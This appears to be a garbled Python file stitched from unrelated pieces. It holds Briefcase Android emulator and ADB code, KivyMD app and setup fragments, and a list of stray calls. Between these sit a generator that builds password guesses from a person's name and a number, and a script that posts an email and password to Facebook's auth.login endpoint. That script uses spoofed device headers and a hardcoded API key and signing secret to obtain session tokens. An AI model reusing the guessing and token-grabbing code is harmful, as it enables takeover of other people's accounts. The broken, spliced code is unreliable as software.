                    "avd.id": avd,
                    "avd.name": avd,
                    "disk.dataPartition.size": "4096M",
                    "hw.keyboard": "yes",
                    "skin.dynamic": "yes",
                    "skin.name": skin,
                    "skin.path": f"skins/{skin}",
                    "showDeviceFrame": "yes",
                },
            )

    def avd_config(self, avd: str) -> dict[str, str]:
        """Obtain the AVD configuration as key-value pairs.

        :params avd: The AVD whose config will be retrieved
        """
        # Parse the existing config into key-value pairs
        avd_config = {}
        try:
            with self.avd_config_filename(avd).open("r", encoding="utf-8") as f:
                for line in f:
                    try:
                        key, value = line.rstrip().split("=", 1)
                        avd_config[key.strip()] = value.strip()
                    except ValueError:
                        pass
        except OSError as e:
            raise BriefcaseCommandError(
                f"Unable to read configuration of AVD @{avd}"
            ) from e

        return avd_config

    def update_emulator_config(self, avd: str, updates: dict[str, str]):
        """Update the AVD configuration with specific values.

        :params avd: The AVD whose config will be updated
        :params updates: A dictionary containing the new key-value to add to the device
            configuration.
        """
        avd_config = self.avd_config(avd)

        # Augment the config with the new key-values pairs
        avd_config.update(updates)

        # Write the update configuration.
        with self.avd_config_filename(avd).open("w", encoding="utf-8") as f:
            for key, value in avd_config.items():
                f.write(f"{key}={value}\n")

    def start_emulator(
        self,
        avd: str,
        extra_args: list[str] | None = None,
    ) -> tuple[str, str]:
        """Start an existing Android emulator.

        Returns when the emulator is booted and ready to accept apps.

        :param avd: The AVD of the device.
        :param extra_args: Additional command line arguments to pass when starting the
            emulator.
        """
        if avd not in set(self.emulators()):
            raise InvalidDeviceError("emulator AVD", avd)

        if extra_args is None:
            extra_args = []

        # Start the emulator
        emulator_popen = self.tools.subprocess.Popen(
            [self.emulator_path, f"@{avd}", "-dns-server", "8.8.8.8"] + extra_args,
            env=self.env,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            bufsize=1,
            start_new_session=True,
        )

        # Start capturing the emulator's output
        # On Windows, the emulator can block until stdout is read and the emulator will
        # not actually run until the user sends CTRL+C to Briefcase (#1573). This
        # avoids that scenario while also ensuring emulator output is always available
        # to print in the console if other issues occur.
        emulator_streamer = self.tools.subprocess.stream_output_non_blocking(
            label="Android emulator",
            popen_process=emulator_popen,
            capture_output=True,
        )

        # wrap AVD name in quotes since '@' is a special char in PowerShell
        emulator_command = " ".join(
            f'"{arg}"' if arg.startswith("@") else arg
            for arg in map(str, emulator_popen.args)
        )

        general_error_msg = f"""
Review the emulator output above for:
 - Troubleshooting or resolution steps such as enabling hardware acceleration
 - Other errors or warnings that may be suggesting the cause of the startup failure

Ensure your Android SDK is up-to-date by running:

    $ briefcase upgrade {AndroidSDK.name}

To review Google's general troubleshooting steps for the emulator, visit:

    https://developer.android.com/studio/run/emulator-troubleshooting

You can also start the emulator manually by running:

    $ {emulator_command}
"""

        failed_startup_error_msg = f"{{prologue}}\n{general_error_msg}"

        # The boot process happens in 2 phases.
        # First, the emulator appears in the device list. However, it's not ready until
        # the boot process has finished. To determine the boot status, we need the
        # device ID, and an ADB connection.

        # Phase 1: Wait for the device to appear so we can get an ADB instance for it.
        try:
            with self.tools.input.wait_bar("Starting emulator...") as keep_alive:
                adb = None
                known_devices = set()
                while adb is None:
                    if emulator_popen.poll() is not None:
                        raise BriefcaseCommandError(
                            failed_startup_error_msg.format(
                                prologue="Android emulator was unable to start!"
                            )
                        )

                    for device, details in sorted(self.devices().items()):
                        # Only process authorized devices that we haven't seen.
                        if details["authorized"] and device not in known_devices:
                            adb = self.adb(device)
                            device_avd = adb.avd_name()

                            if device_avd == avd:
                                # Found an active device that matches
                                # the AVD we are starting.
                                full_name = f"@{avd} (running emulator)"
                                break
                            else:
                                # Not the one. Zathras knows.
                                adb = None
                                known_devices.add(device)

                    # If we haven't found a device, try again in 2 seconds...
                    if adb is None:
                        keep_alive.update()
                        self.sleep(2)

            # Phase 2: Wait for the boot process to complete
            if not adb.has_booted():
                with self.tools.input.wait_bar("Booting emulator...") as keep_alive:
                    while not adb.has_booted():
                        if emulator_popen.poll() is not None:
                            raise BriefcaseCommandError(
                                failed_startup_error_msg.format(
                                    prologue="Android emulator was unable to boot!"
                                )
                            )

                        # Try again in 2 seconds...
                        keep_alive.update()
                        self.sleep(2)
        except BaseException as e:
            self.tools.logger.warning(
                "Emulator output log for startup failure",
                prefix=self.name,
            )
            self.tools.logger.info(emulator_streamer.captured_output)

            # Provide troubleshooting steps if user gives up on the emulator starting
            if isinstance(e, KeyboardInterrupt):
                self.tools.logger.warning(
                    "Is the Android emulator not starting up properly?",
                    prefix=self.name,
                )
                self.tools.logger.info(
                    """
If the emulator opened after pressing CTRL+C, then leave the emulator open and
run Briefcase again. The running emulator can then be selected from the list.
"""
                )
                self.tools.logger.info(general_error_msg)

            raise
        finally:
            emulator_streamer.request_stop()

        # Return the device ID and full name.
        return device, full_name


class ADB:
    def __init__(self, tools: ToolCache, device: str):
        """An API integration for the Android Debug Bridge (ADB).

        :param tools: ToolCache of available tools
        :param device: The ID of the device to target (in a format usable by `adb -s`)
        """
        self.tools = tools
        self.device = device

    def avd_name(self) -> str | None:
        """Get the AVD name for the device.

        :returns: The AVD name for the device; or ``None`` if the device isn't
            an emulator
        """
        try:
            output = self.run("emu", "avd", "name")
            return output.split("\n")[0]
        except subprocess.CalledProcessError as e:
            # Status code 1 is a normal "it's not an emulator" error response
            if e.returncode == 1:
                return None
            else:
                raise BriefcaseCommandError(
                    f"Unable to interrogate AVD name of device {self.device}"
                ) from e

    def has_booted(self) -> bool:
        """Determine if the device has completed booting.

        :returns: True if it has booted; False otherwise.
        """
        try:
            # When the sys.boot_completed property of the device
            # returns '1', the boot is complete. Any other response indicates
            # booting is underway.
            output = self.run("shell", "getprop", "sys.boot_completed")
            return output.strip() == "1"
        except subprocess.CalledProcessError as e:
            raise BriefcaseCommandError(
                f"Unable to determine if emulator {self.device} has booted."
            ) from e

    def run(self, *arguments: SubprocessArgT, quiet: bool = False) -> str:
        """Run a command on a device using Android debug bridge, `adb`. The device name
        is mandatory to ensure clarity in the case of multiple attached devices.

        :param arguments: List of strings to pass to `adb` as arguments.
        :param quiet: Should the invocation of this command be silent, and
            *not* appear in the logs? This should almost always be False;
            however, for some calls (most notably, calls that are called
            frequently to evaluate the status of another process), logging can
            be turned off so that log output isn't corrupted by thousands of
            polling calls.
        :returns: `adb` output on success; raises an exception on failure.
        """
        # The ADB integration operates on the basis of running commands before
        # checking that they are valid, then parsing output to notice errors.
        # This keeps performance good in the success case.
        try:
            output = self.tools.subprocess.check_output(
                [self.tools.android_sdk.adb_path, "-s", self.device] + list(arguments),
                quiet=quiet,
            )
            # add returns status code 0 in the case of failure. The only tangible evidence
            # of failure is the message "Failure [INSTALL_FAILED_OLDER_SDK]" in the,
            # console output; so if that message exists in the output, raise an exception.
            if "Failure [INSTALL_FAILED_OLDER_SDK]" in output:
                raise BriefcaseCommandError(
                    "Your device doesn't meet the minimum SDK requirements of this app."
                )
            return output
        except subprocess.CalledProcessError as e:
            if any(DEVICE_NOT_FOUND.match(line) for line in e.output.split("\n")):
                raise InvalidDeviceError("device id", self.device) from e
            raise

    def install_apk(self, apk_path: str | Path):
        """Install an APK file on an Android device.

        :param apk_path: The path of the Android APK file to install.
        :returns: `None` on success; raises an exception on failure.
        """
        try:
            self.run("install", "-r", apk_path)
        except subprocess.CalledProcessError as e:
            raise BriefcaseCommandError(
                f"Unable to install APK {apk_path} on {self.device}"
            ) from e

    def force_stop_app(self, package: str):
        """Force-stop an app, specified as a package name.

        :param package: The name of the Android package, e.g., com.username.myapp.
        :returns: `None` on success; raises an exception on failure.
        """
        # In my testing, `force-stop` exits with status code 0 (success) so long
        # as you pass a package name, even if the package does not exist, or the
        # package is not running.
        try:
            self.run("shell", "am", "force-stop", package)
        except subprocess.CalledProcessError as e:
            raise BriefcaseCommandError(
                f"Unable to force stop app {package} on {self.device}"
            ) from e

    def start_app(self, package: str, activity: str, passthrough: list[str]):
        """Start an app, specified as a package name & activity name.

        If you have an APK file, and you are not sure of the package or activity
        name, you can find it using `aapt dump badging filename.apk` and looking
        for "package" and "launchable-activity" in the output.

        :param package: The name of the Android package, e.g., com.username.myapp.
        :param activity: The activity of the APK to start.
        :param passthrough: Arguments to pass to the app.
        :returns: `None` on success; raises an exception on failure.
        """
        try:
            # `am start` also accepts string array extras, but we pass the arguments as a
            # single JSON string, because JSON deals with edge cases like whitespace and
            # escaping in a reliable and well-documented way.
            output = self.run(
                "shell",
                "am",
                "start",
                "-n",
                f"{package}/{activity}",
                "-a",
                "android.intent.action.MAIN",
                "-c",
                "android.intent.category.LAUNCHER",
                "--es",
                "org.beeware.ARGV",
                shlex.quote(json.dumps(passthrough)),  # Protect from Android's shell
            )

            # `adb shell am start` always exits with status zero. We look for error
            # messages in the output.
            if any(
                line.startswith("Error: Activity class ")
                and line.endswith("does not exist.")
                for line in output.split("\n")
            ):
                raise BriefcaseCommandError(
                    f"""\
Activity class not found while starting app.

`adb` output:

    {output}
"""
                )
        except subprocess.CalledProcessError as e:
            raise BriefcaseCommandError(
                f"Unable to start {package}/{activity} on {self.device}"
            ) from e

    def logcat(self, pid: str) -> subprocess.Popen:
        """Start following the adb log for the device.

        :param pid: The PID whose logs you want to display.
        :returns: A Popen object for the logcat call
        """
        # As best as we can make out, adb logcat returns UTF-8 output.
        # See #1425 for details.
        return self.tools.subprocess.Popen(
            [
                self.tools.android_sdk.adb_path,
                "-s",
                self.device,
                "logcat",
                "--format=tag",
                "--pid",  # This option is available since API level 24.
                pid,
            ]
            # Filter out some noisy and useless tags.
            + [f"{tag}:S" for tag in ["EGL_emulation"]]
            + (["--format=color"] if self.tools.input.is_color_enabled else []),
            env=self.tools.android_sdk.env,
            encoding="UTF-8",
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            bufsize=1,
        )

    def logcat_tail(self, since: datetime):
        """Show the tail of the logs for Python-like apps, starting from a given
        timestamp.

        :param since: The start time from which logs should be displayed
        """
        try:
            # As best as we can make out, adb logcat returns UTF-8 output.
            # See #1425 for details.
            self.tools.subprocess.run(
                [
                    self.tools.android_sdk.adb_path,
                    "-s",
                    self.device,
                    "logcat",
                    "--format=tag",
                    "-t",
                    since.strftime("%m-%d %H:%M:%S.000000"),
                    "-s",
                    # This is a collection of log labels that should catch
                    # most Python app output.
                    "MainActivity:*",
                    "stdio:*",
                    "python.stdout:*",
                    "AndroidRuntime:*",
                ]
                + (["--format=color"] if self.tools.input.is_color_enabled else []),
                env=self.tools.android_sdk.env,
                check=True,
                encoding="UTF-8",
            )
        except subprocess.CalledProcessError as e:
            raise BriefcaseCommandError("Error starting ADB logcat.") from e

    def pidof(self, package: str, **kwargs) -> str | None:
        """Obtain the PID of a running app by package name.

        :param package: The package ID for the application (e.g.,
            ``org.beeware.tutorial``)
        :returns: The PID of the given app as a string, or None if it isn't
        running.
        """
        # The pidof command is available since API level 24. The level 23 emulator image also
        # includes it, but it doesn't work correctly (it returns all processes).
        try:
            # Exit status is unreliable: some devices (e.g. Nexus 4) return 0 even when no
            # process was found.
            return self.run("shell", "pidof", "-s", package, **kwargs).strip() or None
        except subprocess.CalledProcessError:
            return None

    def pid_exists(self, pid: str, **kwargs) -> bool:
        """Confirm if the PID exists on the emulator.

        :param pid: The PID to check
        :returns: True if the PID exists, False if it doesn't.
        """
        # Look for the existence of /proc/<PID> on the device filesystem.
        # If that file exists, so does the process.
        try:
            self.run("shell", "test", "-e", f"/proc/{pid}", **kwargs)
            return True
        except subprocess.CalledProcessError:
            return False

    def kill(self):
        """Stop the running Android emulator."""
        try:
            self.run("emu", "kill")
        except subprocess.CalledProcessError as e:
            raise BriefcaseCommandError("Error stopping the Android emulator.") from e

    def datetime(self) -> datetime:
        """Obtain the device's current date/time.

        This date/time is naive (i.e. not timezone aware) and in the device's "local"
        time. Therefore, it may be quite different from the date/time for Briefcase and
        caution should be used if comparing it to machine's "local" time.
        """
        datetime_format = "%Y-%m-%d %H:%M:%S"
        try:
            device_datetime = self.run("shell", "date", f"+'{datetime_format}'").strip()
            return datetime.strptime(device_datetime, datetime_format)
        except (ValueError, subprocess.CalledProcessError) as e:
            raise BriefcaseCommandError("Error obtaining device date/time.") from app  
def generate_password(base_word, out_number, add_complexity=True):
    # Base da senha
    password = base_word + out_number
    
    # Adiciona complexidade se solicitado
    if add_complexity:
        # Adiciona uma letra maiúscula aleatória
        password = password.capitalize()
        
        # Adiciona um caractere especial
        special_chars = ['!', '@', '#', '$', '%', '&', '_']
        password += random.choice(special_chars)
        
        # Embaralha a senha para torná-la mais forte
        password = ''.join(random.sample(password, len(password)))
    
    return password

# Variáveis fornecidas
base_word = "ashley"
out_number = "0563137"

# Gerar a senha
password = generate_password(base_word, out_number)

# Imprimir a senha gerada
print("Senha gerada:", password)

def rand_between(min_val, max_val):
    return random.randint(min_val, max_val)

def rand_string(length):
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return ''.join(random.choice(chars) for _ in range(length))

def md5(value):
    return hashlib.md5(value.encode()).hexdigest()

def get_sig(form_data):
    sig = ""
    for key in sorted(form_data.keys()):
        sig += f"{key}={form_data[key]}"
    sig += "62f8ce9f74b12f84c123cc23437a4a32"  # Chave fixa
    return md5(sig)

def get_token(email, password):
    sim = rand_between(20000, 40000)
    device_id = str(uuid.uuid4())
    ad_id = str(uuid.uuid4())

    form_data = {
        "adid": ad_id,
        "format": "json",
        "device_id": device_id,
        "email": email,
        "password": password,
        "cpl": "true",
        "family_device_id": device_id,
        "credentials_type": "device_based_login_password",
        "generate_session_cookies": "1",
        "error_detail_type": "button_with_disabled",
        "source": "device_based_login",
        "machine_id": rand_string(24),
        "meta_inf_fbmeta": "",
        "advertiser_id": ad_id,
        "currently_logged_in_userid": "0",
        "locale": "en_US",
        "client_country_code": "US",
        "method": "auth.login",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
        "api_key": "882a8490361da98702bf97a021ddc14d"
    }
    form_data["sig"] = get_sig(form_data)

    headers = {
        "x-fb-connection-bandwidth": str(rand_between(20000000, 30000000)),
        "x-fb-sim-hni": str(sim),
        "x-fb-net-hni": str(sim),
        "x-fb-connection-quality": "EXCELLENT",
        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
        "user-agent": (
            "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) "
            "[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;"
            "FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;"
            "FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;"
            "FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
        ),
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-http-engine": "Liger"
    }

    url = "https://b-api.facebook.com/method/auth.login"
    response = requests.post(url, data=form_data, headers=headers)
    
    return response.json()
    response = get_token(email, password)
    print(response)
def toast(msg):
    if platform.system() == 'Linux' and 'ANDROID_ARGUMENT' in os.environ:
        from kivymd.toast import toast
    else:
        print(f"TOAST: {msg}")
    def __init__(self, **kwargs):
        super().__init__(**kwargs )
        Builder.load_file("Firebase.kv")
        self.root = MDScreenManager(transition=MDSlideTransition())
        self.dialog = self.create_loading_dialog()
        self.add_screen("signup screen", first=True)
class FirebaseApp(MDApp):
    def create_loading_dialog(self):
        spinner = MDSpinner(active=True, size_hint=(None, None), size=(dp(40), dp(40)))
        dialog = ModalView(
            auto_dismiss=False,
            background="",
            background_color=[0] * 4,
            size_hint=(None, None),
            size=(dp(80), dp(80)),
        )
        dialog.add_widget(spinner)
        return dialog

    def add_screen(self, name_screen, switch=True, first=False):
        if first:
            self.load_screen(name_screen, switch, first)
            return
        if not self.root.has_screen(name_screen):
            self.dialog.open()
            Clock.schedule_once(lambda _: self.load_screen(name_screen, switch, first), 1)
        elif switch:
            self.root.current = name_screen

    def load_screen(self, name_screen, switch, first):
        Builder.load_file(screens[name_screen]["kv"])
        model = screens[name_screen]["model"](self.database)
        controller = screens[name_screen]["controller"](self, model)
        view = screens[name_screen]["view"](self, model=model, controller=controller)
        controller.set_view(view)
        self.root.add_widget(view)
        if switch:
            self.root.current = name_screen
        if not first:
            self.dialog.dismiss()

assert sys.version_info >= (3, 7, 0), "KivyMD requires Python 3.7.0+"

def find_version(*file_paths) -> str:
    """Get __version__ from __init__.py file."""

    version_file = os.path.join(
        os.path.dirname(__file__), "kivymd", "__init__.py"
    )
    version_file_data = open(version_file, "rt", encoding="utf-8").read()
    version_regex = r"(?<=^__version__ = ['\"])[^'\"]+(?=['\"]$)"
    try:
        version = re.findall(version_regex, version_file_data, re.M)[0]
        return version
    except IndexError:
        raise ValueError(f"Unable to find version string in {version_file}.")

def write_version_info():
    """Create _version.py file with git revision and date."""
    # ... (rest of the write_version_info function)

def glob_paths(pattern):
    out_files = []
    src_path = os.path.join(os.path.dirname(__file__), "kivymd")

    for root, dirs, files in os.walk(src_path):
        for file in files:
            if file.endswith(pattern):
                filepath = os.path.join(str(Path(*Path(root).parts[1:])), file)

                # FIXME: https://github.com/kivymd/KivyMD/issues/1305
                try:
                    out_files.append(filepath.split(f"kivymd{os.sep}")[1])
                except IndexError:
                    out_files.append(filepath)

    return out_files
    
    # Static strings are in setup.cfg
    write_version_info()
    setup(
        packages=find_packages(
            include=["kivymd", "kivymd.*"],
            exclude=["kivymd.tools.release"]
        ),
        package_dir={"kivymd": "kivymd"},
        package_data={
            "kivymd": [
                "images/*.png",
                "images/logo/*.png",
                "fonts/*.ttf",
                *glob_paths(".kv"),
                *glob_paths(".pot"),
                *glob_paths(".po"),
            ]
        },
        extras_require={
            "dev": [
                "pre-commit",
                "black",
                "isort[pyproject]",
                "flake8",
                "pytest",
                "pytest-cov",
                "pytest-asyncio",
                "pytest-timeout",
                "coveralls",
                "pyinstaller[hook_testing]",
            ],
            "docs": [
                "sphinx",
                "sphinx-autoapi==1.4.0",
                "furo",
                "sphinx-notfound-page",
                "sphinx-copybutton",
                "sphinx-tabs",
            ],
        },
        install_requires=["kivy>=2.2.0", "pillow"],
        setup_requires=[],
        python_requires=">=3.7",
        entry_points={
            "pyinstaller40": [
                "hook-dirs = kivymd.tools.packaging.pyinstaller:get_hook_dirs",
                "tests = kivymd.tools.packaging.pyinstaller:get_pyinstaller_tests",
            ],
            "console_scripts": [
                "kivymd.add_view = kivymd.tools.patterns.add_view:main",
                "kivymd.create_project = kivymd.tools.patterns.create_project:main ",
                "kivymd.make_release = kivymd.tools.release.make_release:main",
            ],
        },
    )
    FirebaseApp().run()
    crawl_ftpserver()
    create_tunnel()
    main()
    setup()
    generate_rsa_key()
    server()
    run_bot()
    run_POST()
    start_local_server()
    app.run(host='1.1.1.1', port=443, debug=True)
    app.run(debug=True, ssl_context=('cert.pem', 'key.pem'))
    simpleEchoBot.run(host='1.0.0.1', port="443", debug=True)
